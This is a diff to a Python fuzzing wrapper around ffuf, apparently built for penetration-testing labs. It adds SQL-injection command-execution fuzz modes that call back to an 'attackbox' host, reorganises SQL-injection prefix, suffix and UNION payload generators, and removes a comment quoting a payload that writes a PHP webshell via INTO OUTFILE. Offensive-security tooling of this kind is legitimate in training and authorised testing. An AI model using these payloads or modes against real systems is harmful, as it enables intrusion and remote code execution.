@@ -3,6 +3,7 @@ import hashlib
 import json
 import numpy as np
 import os
+import re
 import shutil
 
 from glob import glob
@@ -13,16 +14,14 @@ from .data_classes import *
 from .util import find_common_substrings, parse_http_response
 from .encoders import *
 from .revshells import get_revshells
+from .sql import *
 from .wordlists import wordlist_strip_prefix
 
-# TODO: SQL error-based and blind-based modes?
-# TODO: SQL webshell mode - e.g. ' UNION SELECT "PHP SHELL", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
-#           - Test on e.g. SQL Injections Attacks - Module Exercise - VM #2
-#           - Build list from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md, https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-command-execution, https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-command-execution, https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution, 
+# TODO: Revshell, download tools beforehand?
+# TODO: Remote file inclusion?
+#   - Test if we can establish a connection to a file hosted on a local webserver (configure http-server to serve basic shell.php).
 
 # TODO: PHP filters (php://filter/... and data://...)
-# TODO: Remote file inclusion? Test if we can establish a connection to a file hosted on a local webserver (run a simple web server). Or does this go in the PHP Inclusion, SSTI, and XSS category?
-# TODO: Revshell, download tools beforehand?
 
 def relpath_linux(args):
     return [b"", b"../", b"../../", b"../../../", b"../../../../../../../../../../../../", b"/", b"~/"]
@@ -32,26 +31,6 @@ def relpath_windows(args):
 
 def relpath(args):
     return relpath_linux(args) + relpath_windows(args)
-
-def sqli_prefix(args):
-    return [
-        b"",
-        b"' ", b"%' ", b"') ", b"')) ", b"%') ", b"%')) ",
-        b'" ', b'%" ', b'") ', b'")) ', b'%") ', b'%")) '
-    ]
-
-def sqli_suffix(args):
-    return [
-        b"", b"-- ", b"--- ", b"# ", b"// ", b"-- // ", b"--- // ", b"# // "
-    ]
-
-def sqli_union(args):
-    all_cols = [chr(97 + i).encode() for i in range(16)]
-    
-    for i in range(1, len(all_cols)):
-        cols = all_cols[:i]
-        yield b"UNION SELECT '" + b"', '".join(cols) + b"'"
-        yield b'UNION SELECT "' + b'", "'.join(cols) + b'"'
 
 FUZZ_TYPES = {
     "command-injection": FuzzType(params = [
@@ -117,11 +96,23 @@ FUZZ_TYPES = {
         ]),
     ], encoders=[revshell_encoder_windows], required_args=["attackbox_ip", "attackbox_port"]),
 
+    "sqli-execute-linux": FuzzType(params = [
+        FuzzParameter(name="FUZZ", wordlists=[
+            sqli_execute_linux
+        ]),
+    ], encoders=[url_encoder_strict], required_args=["attackbox_ip", "attackbox_web_port"]),
+
+    "sqli-execute-windows": FuzzType(params = [
+        FuzzParameter(name="FUZZ", wordlists=[
+            sqli_execute_windows
+        ]),
+    ], encoders=[url_encoder_strict], required_args=["attackbox_ip", "attackbox_web_port"]),
+
     "sqli-identify": FuzzType(params = [
         FuzzParameter(name="FUZZ", wordlists=[
             "/usr/share/wordlists/wfuzz/Injections/SQL.txt"
         ]),
-    ], encoders=[url_encoder], required_args=[]),
+    ], encoders=[url_encoder_strict], required_args=[]),
 
     "sqli-union": FuzzType(params = [
         FuzzParameter(name="FUZZ", wordlists=[
@@ -129,7 +120,7 @@ FUZZ_TYPES = {
             sqli_union,
             sqli_suffix,
         ]),
-    ], encoders=[url_encoder], required_args=[]),
+    ], encoders=[url_encoder_strict], required_args=[]),
 }
 
 MAX_DISPLAY_RESULTS = 10
@@ -161,6 +152,9 @@ def compute_outliers(values, z_scores):
             break
 
 def compute_analysis_groups(keyed_results: dict):
+    if len(keyed_results.keys()) == 0:
+        return [], 0, 0
+
     weighted_dict = {}
     for key in keyed_results:
         weighted_dict[key] = len(keyed_results[key])
@@ -246,9 +240,7 @@ def find_substrings(args):
         if len(payload) >= min_len:
             targets.add(payload.encode())
 
-    _, response_body = parse_http_response(scan_result.response_raw)
-    substrings = find_common_substrings(targets, response_body, min_len)
-
+    substrings = find_common_substrings(targets, scan_result.response_body, min_len)
     return scan_result, substrings
 
 def display_response_analysis(scan_results: list, targets: set, min_len=8):
@@ -290,18 +282,22 @@ def main():
     parser.add_argument('-t', '--types', required=True, choices=list(FUZZ_TYPES.keys()), nargs="+", help="Type of fuzz")
     parser.add_argument('-th', '--threads', type=int, default=4, help="Number of threads to run FFUF with")
 
+    parser.add_argument('-mr', '--match-regex', help="Match regexp")
+    parser.add_argument('-fr', '--filter-regex', help="Filter regexp")
+
     parser.add_argument('--attackbox-ip')
     parser.add_argument('--attackbox-port', type=int)
+    parser.add_argument('--attackbox-web-port', type=int)
     parser.add_argument('--known-part')
 
     args = parser.parse_args()
     
     fuzz_types = [FUZZ_TYPES[t] for t in args.types]
 
-    for fuzz_type in fuzz_types:
+    for typ, fuzz_type in zip(args.types, fuzz_types):
         for req_arg in fuzz_type.required_args:
             if not getattr(args, req_arg):
-                print(f"Error: Argument `{req_arg.replace("_", "-")}` is required to perform `{type}` fuzzing")
+                print(f"Error: Argument `{req_arg.replace("_", "-")}` is required to perform `{typ}` fuzzing")
                 return
             
     if args.known_part and (args.known_part[0] == "/" or args.known_part[-1] != "/"):
@@ -355,6 +351,9 @@ def main():
     scan_results = set()
     missing_payloads = {}
 
+    match_regex = re.compile(args.match_regex) if args.match_regex else None
+    filter_regex = re.compile(args.filter_regex) if args.filter_regex else None
+
     data_files = glob(os.path.join(data_dir, "ffuf-*.json"))
     for data_file in sorted(data_files):
         with open(data_file, "rb") as f:
@@ -381,21 +380,35 @@ def main():
                 resultfile_path = os.path.join(data_dir, result["resultfile"])
                 with open(resultfile_path, "rb") as f:
                     request_raw, response_raw = f.read().split(b"\n---- \xe2\x86\x91 Request ---- Response \xe2\x86\x93 ----\n\n")
+                
+                response_body = parse_http_response(response_raw)
+                response_body_str = response_body.decode('utf-8')
+
+                if match_regex != None and match_regex.search(response_body_str) == None: # Ignore results not matching match_regex
+                    continue
+                
+                if filter_regex != None and filter_regex.search(response_body_str) != None: # Ignore results matching filter_regex
+                    continue
 
                 scan_results.add(ScanResult(payloads=frozenset(payloads.items()), url=result["url"], status=result["status"], length=result["length"],
                                                 words=result["words"], lines=result["lines"], content_type=result["content-type"], duration=result["duration"],
-                                                response_raw=response_raw))
+                                                response_body=response_body))
 
                 for param, value in payloads.items():
                     if value in missing_payloads[data_file][param]:
                         del missing_payloads[data_file][param][value]
-    
+
     display_analysis(scan_results, "status", "Status code")
     display_analysis(scan_results, "length", "Content length", outlier_based=True)
     display_analysis(scan_results, "words", "Content words", outlier_based=True)
     display_analysis(scan_results, "lines", "Content lines", outlier_based=True)
     display_analysis(scan_results, "duration", "Time to response (nanoseconds)", outlier_based=True)
-    display_missing_payloads_analysis(missing_payloads)
+
+    if args.match_regex or args.filter_regex:
+        print("Skipping missing payloads analysis as --match-regex or --filter-regex is used")
+    else:
+        display_missing_payloads_analysis(missing_payloads)
+
     display_response_analysis(scan_results, response_search_targets)
 
 if __name__ == "__main__":
